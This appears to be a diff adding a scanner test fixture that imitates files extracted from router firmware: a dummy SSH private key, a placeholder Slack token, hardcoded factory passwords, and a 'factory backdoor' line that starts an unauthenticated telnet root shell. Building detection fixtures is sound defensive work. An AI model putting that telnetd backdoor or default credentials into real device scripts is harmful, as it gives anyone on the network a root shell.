@@ -1,0 +1,21 @@
+# ---- squashfs root extracted from a consumer router image (binwalk) ----
+
+# /etc/dropbear/dropbear_ed25519_host_key (exported to PEM during analysis)
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+RUMMYKEYMATERIALforDEMOpurposesONLYnotAREALkey00000000000000000000000=
+-----END OPENSSH PRIVATE KEY-----
+
+# /etc/init.d/telnet_enable  -- factory backdoor shell on the LAN
+busybox telnetd -l /bin/sh -p 9527 -b 192.168.1.1
+
+# /usr/sbin/cloud_notify.sh  -- vendor alerting integration
+SLACK_WEBHOOK_TOKEN=xoxb-EXAMPLE-NOT-A-REAL-TOKEN-demo0only0value0here
+NOTIFY_URL="https://hooks.example.com/services/notify"
+
+# /etc/factory_defaults.conf
+admin_password="Admin@1234Factory"
+guest_password="changeme"
+
+# harmless banner text -- must NOT be flagged
+motd="Welcome. Unauthorized access is prohibited."
